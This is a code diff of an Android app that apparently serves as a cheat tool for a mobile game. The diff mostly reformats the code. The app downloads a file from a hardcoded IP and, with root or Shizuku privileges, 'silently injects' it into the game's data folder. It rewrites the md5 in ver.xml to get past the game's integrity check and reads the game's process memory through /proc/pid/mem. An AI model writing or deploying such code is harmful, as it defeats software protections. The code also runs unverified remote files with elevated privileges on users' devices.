@@ -680,58 +803,35 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
         };
         new Thread(() -> {
             boolean allSuccess = true;
-            for (String relativePath : targetFiles) {
-                if (!deleteFromAndroidData(relativePath)) allSuccess = false;
-            }
+            for (String relativePath : targetFiles) { if (!deleteFromAndroidData(relativePath)) allSuccess = false; }
             boolean finalAllSuccess = allSuccess;
             runOnUiThread(() -> Toast.makeText(this, finalAllSuccess ? "清理完成" : "部分清理失败", Toast.LENGTH_SHORT).show());
         }).start();
     }
 
-    // ==========================================
-    // 新增：添加退出功能 (网络解析+静默注入)
-    // ==========================================
-
     private void processAddExit() {
         Toast.makeText(this, "正在获取服务器最新配置...", Toast.LENGTH_SHORT).show();
-        Request request = new Request.Builder()
-                .url("http://156.243.244.97/share/1.txt")
-                .get()
-                .build();
-
+        Request request = new Request.Builder().url("http://156.243.244.97/share/1.txt").get().build();
         httpClient.newCall(request).enqueue(new Callback() {
-            @Override
-            public void onFailure(@NonNull Call call, @NonNull IOException e) {
+            @Override public void onFailure(@NonNull Call call, @NonNull IOException e) {
                 runOnUiThread(() -> Toast.makeText(NewActivity.this, "获取失败，请检查网络", Toast.LENGTH_SHORT).show());
             }
-
-            @Override
-            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
+            @Override public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                 if (!response.isSuccessful() || response.body() == null) {
-                    runOnUiThread(() -> Toast.makeText(NewActivity.this, "服务器响应异常", Toast.LENGTH_SHORT).show());
-                    return;
+                    runOnUiThread(() -> Toast.makeText(NewActivity.this, "服务器响应异常", Toast.LENGTH_SHORT).show()); return;
                 }
                 String result = response.body().string();
-                String bianyishijian = "";
-                String wjlj = "";
+                String bianyishijian = ""; String wjlj = "";
                 try {
                     Matcher mTime = Pattern.compile("bianyishijian=\"([^\"]+)\"").matcher(result);
                     if (mTime.find()) bianyishijian = mTime.group(1);
-
                     Matcher mUrl = Pattern.compile("wjlj=\"([^\"]+)\"").matcher(result);
                     if (mUrl.find()) wjlj = mUrl.group(1);
                 } catch (Exception e) {}
-
-                if (wjlj.isEmpty()) {
-                    runOnUiThread(() -> Toast.makeText(NewActivity.this, "未获取到下载链接", Toast.LENGTH_SHORT).show());
-                    return;
-                }
-
-                final String finalTime = bianyishijian;
-                final String finalUrl = wjlj;
-
+                if (wjlj.isEmpty()) { runOnUiThread(() -> Toast.makeText(NewActivity.this, "未获取到下载链接", Toast.LENGTH_SHORT).show()); return; }
+                final String finalTime = bianyishijian; final String finalUrl = wjlj;
                 runOnUiThread(() -> {
-                    showNeuDialog("发现新版本配置", "最新编译时间：\n" + finalTime + "\n\n即将开始下载并静默注入，请耐心等待...",
+                    showNeuDialog("道具赛+部分模式", "最新编译时间：" + finalTime + "\n验证方法：闪击战查看退出按钮提示内容是否有变化\n\n即将开始下载并静默注入，请耐心等待...",
                             () -> downloadAndApplyExitConfig(finalUrl));
                 });
             }
@@ -783,7 +883,9 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
                 try (BufferedReader br = new BufferedReader(new FileReader(localTempXml))) {
                     String line;
                     while ((line = br.readLine()) != null) {
-                        if (line.contains("config.unity3d")) {
+                        // 【核心修复】：加上双引号和父目录，精准匹配 common/data/config.unity3d
+                        // 这样就绝对不会误伤 shopconfig.unity3d 和 activityconfig.unity3d 了！
+                        if (line.contains("\"common/data/config.unity3d\"")) {
                             line = line.replaceAll("md5=\"[^\"]*\"", "md5=\"" + md5 + "\"");
                             found = true;
                         }
@@ -799,7 +901,7 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
                         runOnUiThread(() -> Toast.makeText(this, "覆盖 ver.xml 失败", Toast.LENGTH_SHORT).show());
                     }
                 } else {
-                    runOnUiThread(() -> Toast.makeText(this, "未在 ver.xml 中找到 config.unity3d 节点", Toast.LENGTH_SHORT).show());
+                    runOnUiThread(() -> Toast.makeText(this, "未在 ver.xml 中找到 common/data/config.unity3d 节点", Toast.LENGTH_SHORT).show());
                 }
 
                 if (renamedFile.exists()) renamedFile.delete();
@@ -816,45 +918,25 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
         try {
             MessageDigest digest = MessageDigest.getInstance("MD5");
             FileInputStream fis = new FileInputStream(file);
-            byte[] byteArray = new byte[8192];
-            int bytesCount;
-            while ((bytesCount = fis.read(byteArray)) != -1) {
-                digest.update(byteArray, 0, bytesCount);
-            }
+            byte[] byteArray = new byte[8192]; int bytesCount;
+            while ((bytesCount = fis.read(byteArray)) != -1) digest.update(byteArray, 0, bytesCount);
             fis.close();
             byte[] bytes = digest.digest();
             StringBuilder sb = new StringBuilder();
-            for (byte b : bytes) {
-                sb.append(String.format("%02x", b));
-            }
+            for (byte b : bytes) sb.append(String.format("%02x", b));
             return sb.toString();
-        } catch (Exception e) {
-            e.printStackTrace();
-            return null;
-        }
+        } catch (Exception e) { return null; }
     }
 
-    // ==========================================
-    // 内存与悬浮窗区
-    // ==========================================
-
     private void startMemoryHackProcess() {
-        if (!new RootBeer(this).isRooted()) {
-            Toast.makeText(this, "悬浮窗读取仅支持 Root", Toast.LENGTH_SHORT).show();
-            return;
-        }
+        if (!new RootBeer(this).isRooted()) { Toast.makeText(this, "请获取Root权限", Toast.LENGTH_SHORT).show(); return; }
         new Thread(() -> {
             try {
                 String finalAddress = resolvePointerChainAndGetAddress();
                 int pid = getProcessID(TARGET_PKG);
-                String msg = (pid > 0) ? "解析成功，基址: " + finalAddress : "游戏未运行";
-                runOnUiThread(() -> {
-                    Toast.makeText(this, msg, Toast.LENGTH_LONG).show();
-                    if (finalAddress != null) startFloatWindowAndGame(finalAddress);
-                });
-            } catch (Exception e) {
-                runOnUiThread(() -> Toast.makeText(this, "解析失败，请先启动游戏", Toast.LENGTH_SHORT).show());
-            }
+                String msg = (pid > 0) ? "获取基址成功" : "游戏未运行";
+                runOnUiThread(() -> { Toast.makeText(this, msg, Toast.LENGTH_LONG).show(); if (finalAddress != null) startFloatWindowAndGame(finalAddress); });
+            } catch (Exception e) { runOnUiThread(() -> Toast.makeText(this, "获取失败，请先启动游戏", Toast.LENGTH_SHORT).show()); }
         }).start();
     }
 
@@ -884,26 +966,20 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
 
     private int getProcessID(String pkgName) {
         try {
-            Process p = Runtime.getRuntime().exec("su");
-            DataOutputStream os = new DataOutputStream(p.getOutputStream());
-            os.writeBytes("pidof " + pkgName + "\nexit\n");
-            os.flush();
+            Process p = Runtime.getRuntime().exec("su"); DataOutputStream os = new DataOutputStream(p.getOutputStream());
+            os.writeBytes("pidof " + pkgName + "\nexit\n"); os.flush();
             BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
             String line = reader.readLine();
             if (line != null && !line.trim().isEmpty()) return Integer.parseInt(line.trim().split("\\s+")[0]);
-        } catch (Exception e) {}
-        return -1;
+        } catch (Exception e) {} return -1;
     }
 
     private long getModuleBaseAddress(int pid, String moduleName) {
         try {
-            Process p = Runtime.getRuntime().exec("su");
-            DataOutputStream os = new DataOutputStream(p.getOutputStream());
-            os.writeBytes("cat /proc/" + pid + "/maps\nexit\n");
-            os.flush();
+            Process p = Runtime.getRuntime().exec("su"); DataOutputStream os = new DataOutputStream(p.getOutputStream());
+            os.writeBytes("cat /proc/" + pid + "/maps\nexit\n"); os.flush();
             BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
-            String line;
-            boolean foundSo = false;
+            String line; boolean foundSo = false;
             while ((line = reader.readLine()) != null) {
                 if (line.contains(moduleName)) foundSo = true;
                 if (foundSo && line.contains("[anon:.bss]")) {
@@ -911,83 +987,57 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
                     return new BigInteger(range.substring(0, range.indexOf("-")), 16).longValue();
                 }
             }
-        } catch (Exception e) {}
-        return 0L;
+        } catch (Exception e) {} return 0L;
     }
 
     private long readMemoryLong(int pid, long address) {
         try {
             Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", "dd if=/proc/" + pid + "/mem bs=1 count=8 skip=" + address + " 2>/dev/null"});
-            InputStream in = p.getInputStream();
-            byte[] buffer = new byte[8];
-            int read = 0;
-            while (read < 8) {
-                int r = in.read(buffer, read, 8 - read);
-                if (r == -1) break;
-                read += r;
-            }
+            InputStream in = p.getInputStream(); byte[] buffer = new byte[8]; int read = 0;
+            while (read < 8) { int r = in.read(buffer, read, 8 - read); if (r == -1) break; read += r; }
             if (read == 8) return ByteBuffer.wrap(buffer).order(ByteOrder.LITTLE_ENDIAN).getLong();
-        } catch (Exception e) {}
-        return -1L;
+        } catch (Exception e) {} return -1L;
     }
-
-    // ==========================================
-    // 文件读写底层 API (Root/Shizuku/SAF)
-    // ==========================================
 
     private boolean copyToAndroidData(File localFile, String targetRelativePath) {
         String fullPath = "/storage/emulated/0/Android/data/" + TARGET_PKG + "/" + targetRelativePath;
         String dirOnly = fullPath.substring(0, fullPath.lastIndexOf("/"));
         if (executePrivilegedCommand("mkdir -p \"" + dirOnly + "\" && cp -f \"" + localFile.getAbsolutePath() + "\" \"" + fullPath + "\"")) return true;
-
         String uriStr = getSharedPreferences(PREFS_NAME, MODE_PRIVATE).getString(DATA_URI_KEY, null);
         if (uriStr != null) {
             try {
                 DocumentFile targetDoc = getDocumentFileSafely(targetRelativePath, true, false);
                 if (targetDoc != null) {
-                    try (OutputStream out = getContentResolver().openOutputStream(targetDoc.getUri(), "wt");
-                         InputStream in = new FileInputStream(localFile)) {
-                        byte[] buffer = new byte[8192];
-                        int read;
-                        while ((read = in.read(buffer)) != -1) out.write(buffer, 0, read);
+                    try (OutputStream out = getContentResolver().openOutputStream(targetDoc.getUri(), "wt"); InputStream in = new FileInputStream(localFile)) {
+                        byte[] buffer = new byte[8192]; int read; while ((read = in.read(buffer)) != -1) out.write(buffer, 0, read);
                         return true;
                     }
                 }
-            } catch (Exception e) { e.printStackTrace(); }
-        }
-        return false;
+            } catch (Exception e) {}
+        } return false;
     }
 
     private boolean copyFromAndroidData(String sourceRelativePath, File localDest) {
         String fullPath = "/storage/emulated/0/Android/data/" + TARGET_PKG + "/" + sourceRelativePath;
         if (executePrivilegedCommand("cp -f \"" + fullPath + "\" \"" + localDest.getAbsolutePath() + "\"")) return true;
-
         String uriStr = getSharedPreferences(PREFS_NAME, MODE_PRIVATE).getString(DATA_URI_KEY, null);
         if (uriStr != null) {
             try {
                 DocumentFile sourceDoc = getDocumentFileSafely(sourceRelativePath, false, false);
                 if (sourceDoc != null && sourceDoc.exists()) {
-                    try (InputStream in = getContentResolver().openInputStream(sourceDoc.getUri());
-                         OutputStream out = new FileOutputStream(localDest)) {
-                        byte[] buffer = new byte[8192];
-                        int read;
-                        while ((read = in.read(buffer)) != -1) out.write(buffer, 0, read);
+                    try (InputStream in = getContentResolver().openInputStream(sourceDoc.getUri()); OutputStream out = new FileOutputStream(localDest)) {
+                        byte[] buffer = new byte[8192]; int read; while ((read = in.read(buffer)) != -1) out.write(buffer, 0, read);
                         return true;
                     }
                 }
-            } catch (Exception e) { e.printStackTrace(); }
-        }
-        return false;
+            } catch (Exception e) {}
+        } return false;
     }
 
     private boolean deleteFromAndroidData(String relativePath) {
         String fullPath = "/storage/emulated/0/Android/data/" + TARGET_PKG + "/" + relativePath;
         if (executePrivilegedCommand("rm -f \"" + fullPath + "\"")) return true;
-        try {
-            DocumentFile target = getDocumentFileSafely(relativePath, false, false);
-            if (target != null && target.exists()) return target.delete();
-        } catch(Exception e) {}
-        return false;
+        try { DocumentFile target = getDocumentFileSafely(relativePath, false, false); if (target != null && target.exists()) return target.delete(); } catch(Exception e) {} return false;
     }
 
     private DocumentFile getDocumentFileSafely(String relativePath, boolean createIfMissing, boolean isDirectory) {
@@ -997,88 +1047,58 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
         if (current == null) return null;
         String[] parts = relativePath.split("/");
         for (int i = 0; i < parts.length; i++) {
-            String part = parts[i];
-            if (part.isEmpty()) continue;
+            String part = parts[i]; if (part.isEmpty()) continue;
             DocumentFile next = current.findFile(part);
             if (next == null) {
-                if (createIfMissing) {
-                    next = (i == parts.length - 1 && !isDirectory) ? current.createFile("*/*", part) : current.createDirectory(part);
-                } else return null;
+                if (createIfMissing) next = (i == parts.length - 1 && !isDirectory) ? current.createFile("*/*", part) : current.createDirectory(part);
+                else return null;
             }
             current = next;
-        }
-        return current;
+        } return current;
     }
 
     private boolean executePrivilegedCommand(String command) {
         try {
             if (Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED) {
                 Method m = Shizuku.class.getDeclaredMethod("newProcess", String[].class, String[].class, String.class);
-                m.setAccessible(true);
-                Process p = (Process) m.invoke(null, new Object[]{new String[]{"sh", "-c", command}, null, null});
-                return p.waitFor() == 0;
+                m.setAccessible(true); Process p = (Process) m.invoke(null, new Object[]{new String[]{"sh", "-c", command}, null, null}); return p.waitFor() == 0;
             }
         } catch (Throwable t) {}
         if (new RootBeer(this).isRooted()) {
-            try {
-                Process p = Runtime.getRuntime().exec("su");
-                DataOutputStream os = new DataOutputStream(p.getOutputStream());
-                os.writeBytes(command + "\nexit\n");
-                os.flush();
-                return p.waitFor() == 0;
-            } catch (Exception e) {}
-        }
-        return false;
+            try { Process p = Runtime.getRuntime().exec("su"); DataOutputStream os = new DataOutputStream(p.getOutputStream()); os.writeBytes(command + "\nexit\n"); os.flush(); return p.waitFor() == 0; } catch (Exception e) {}
+        } return false;
     }
 
     private void updatePermissionStatus(boolean hasPermission) {
         if (hasPermission) {
             if (layoutPermissionContainer.getVisibility() != View.GONE) {
-                layoutPermissionContainer.setVisibility(View.GONE);
-                layoutActionContainer.setVisibility(View.VISIBLE);
-                layoutActionContainer.setAlpha(0f);
-                layoutActionContainer.animate().alpha(1f).setDuration(500).start();
+                layoutPermissionContainer.setVisibility(View.GONE); layoutActionContainer.setVisibility(View.VISIBLE);
+                layoutActionContainer.setAlpha(0f); layoutActionContainer.animate().alpha(1f).setDuration(500).start();
             }
-            permissionStatus.setText("已授权");
-            permissionStatus.setTextColor(Color.parseColor("#48BB78"));
+            permissionStatus.setText("已授权"); permissionStatus.setTextColor(Color.parseColor("#48BB78"));
         } else {
-            layoutPermissionContainer.setVisibility(View.VISIBLE);
-            layoutActionContainer.setVisibility(View.GONE);
-            permissionStatus.setText("未授权");
-            permissionStatus.setTextColor(Color.parseColor("#E53E3E"));
+            layoutPermissionContainer.setVisibility(View.VISIBLE); layoutActionContainer.setVisibility(View.GONE);
+            permissionStatus.setText("未授权"); permissionStatus.setTextColor(Color.parseColor("#E53E3E"));
         }
     }
 
     private void checkHasPermission() {
         boolean shizukuOk = false;
         try { if (Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED) shizukuOk = true; } catch (Throwable t) {}
-        if (shizukuOk || new RootBeer(this).isRooted()) {
-            updatePermissionStatus(true);
-            return;
-        }
+        if (shizukuOk || new RootBeer(this).isRooted()) { updatePermissionStatus(true); return; }
         String uriStr = getSharedPreferences(PREFS_NAME, MODE_PRIVATE).getString(DATA_URI_KEY, null);
-        if (uriStr != null) {
-            try {
-                if (DocumentFile.fromTreeUri(this, Uri.parse(uriStr)).canRead()) {
-                    updatePermissionStatus(true);
-                    return;
-                }
-            } catch (Exception e) {}
-        }
+        if (uriStr != null) { try { if (DocumentFile.fromTreeUri(this, Uri.parse(uriStr)).canRead()) { updatePermissionStatus(true); return; } } catch (Exception e) {} }
         updatePermissionStatus(false);
     }
 
     private void copyAssetsToExternalFilesDir() {
         if (getSharedPreferences(PREFS_NAME, MODE_PRIVATE).getBoolean(PREF_ASSETS_COPIED, false)) return;
-        File targetDir = getExternalFilesDir(null);
-        if (!targetDir.exists()) targetDir.mkdirs();
+        File targetDir = getExternalFilesDir(null); if (!targetDir.exists()) targetDir.mkdirs();
         try {
             String[] files = getAssets().list("");
             if (files != null) {
                 for (String f : files) {
-                    try (InputStream in = getAssets().open(f); OutputStream out = new FileOutputStream(new File(targetDir, f))) {
-                        byte[] buf = new byte[1024]; int len; while ((len = in.read(buf)) != -1) out.write(buf, 0, len);
-                    } catch (IOException ignored) {}
+                    try (InputStream in = getAssets().open(f); OutputStream out = new FileOutputStream(new File(targetDir, f))) { byte[] buf = new byte[1024]; int len; while ((len = in.read(buf)) != -1) out.write(buf, 0, len); } catch (IOException ignored) {}
                 }
             }
         } catch (IOException ignored) {}
@@ -1087,10 +1107,8 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
 
     private void openDataDirectory() {
         Intent intent = new Intent(Intent.ACTION_OPEN_DOCUMENT_TREE);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
-            intent.putExtra(DocumentsContract.EXTRA_INITIAL_URI, DocumentsContract.buildDocumentUri("com.android.externalstorage.documents", "primary:Android/data"));
-        Toast.makeText(this, "请授权 " + TARGET_PKG + " 目录", Toast.LENGTH_LONG).show();
-        openDirectoryLauncher.launch(intent);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) intent.putExtra(DocumentsContract.EXTRA_INITIAL_URI, DocumentsContract.buildDocumentUri("com.android.externalstorage.documents", "primary:Android/data"));
+        Toast.makeText(this, "请授权 " + TARGET_PKG + " 目录", Toast.LENGTH_LONG).show(); openDirectoryLauncher.launch(intent);
     }
 
     private void handleShizuku() {
@@ -1105,13 +1123,10 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
 
     @Override protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
-        if (requestCode == REQUEST_CODE_FLOAT_WINDOW) {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.canDrawOverlays(this)) startMemoryHackProcess();
-        }
+        if (requestCode == REQUEST_CODE_FLOAT_WINDOW) { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.canDrawOverlays(this)) startMemoryHackProcess(); }
     }
 
     @Override protected void onDestroy() {
-        super.onDestroy();
-        try { Shizuku.removeRequestPermissionResultListener(requestPermissionResultListener); } catch(Throwable t){}
+        super.onDestroy(); try { Shizuku.removeRequestPermissionResultListener(requestPermissionResultListener); } catch(Throwable t){}
     }
 }
